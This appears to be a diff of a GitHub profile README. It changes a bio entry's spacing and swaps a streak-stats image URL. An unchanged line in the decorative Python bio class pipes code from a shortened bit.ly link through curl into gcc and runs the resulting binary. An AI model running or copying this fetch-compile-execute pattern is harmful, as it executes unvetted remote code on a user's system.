@@ -8,7 +8,7 @@ class PROxZIMA:
   def __init__(self):
     subprocess.call("curl -sL 'bit.ly/pr0x21m4' | gcc -w -o name -xc - && ./name", shell=True)
     self.bio = {
-      '- 💼 I’m currently working for': {'Emerson' : 'https://www.emerson.com/en-us/global'},
+      '- 💼 I’m currently working for': {'Emerson'  : 'https://www.emerson.com/en-us/global'},
       '- 🔭 I’m currently working on' : {'Contribution Hub' : 'https://github.com/PROxZIMA/ContributionManager',
                                          'DarkSpider': 'https://github.com/PROxZIMA/DarkSpider',
                                          'Prism'     : 'https://github.com/PROxZIMA/prism'},
@@ -86,7 +86,7 @@ if __name__ == '__main__':
 <table style="border:none;margin:0 auto">
   <tr style="border:none;">
     <td style="border:none;"><a target="_blank" href="https://github.com/stats-organization/github-stats-extended"><img src="https://github-stats-extended.vercel.app/api?username=proxzima&include_all_commits=true&count_private=true&show_icons=true&theme=dracula&text_color=8b8b8b&bg_color=0000&hide_border=true&custom_title=PROxZIMA%27s%20Github%20Stats" alt="My Stats"/></a></td>
-    <td style="border:none;"><a target="_blank" href="https://github.com/DenverCoder1/github-readme-streak-stats"><img src="https://github-readme-streak-stats.herokuapp.com?user=PROxZIMA&theme=dracula&dates=8b8b8b&background=0000&hide_border=true" alt="My Streak"/></a></td>
+    <td style="border:none;"><a target="_blank" href="https://github.com/DenverCoder1/github-readme-streak-stats"><img src="https://github-readme-streak-stats-git-main-proxzimas-projects.vercel.app?user=PROxZIMA&theme=dracula&dates=8b8b8b&background=0000&hide_border=true" alt="My Streak"/></a></td>
   </tr>
 </table>
 <p align="center">
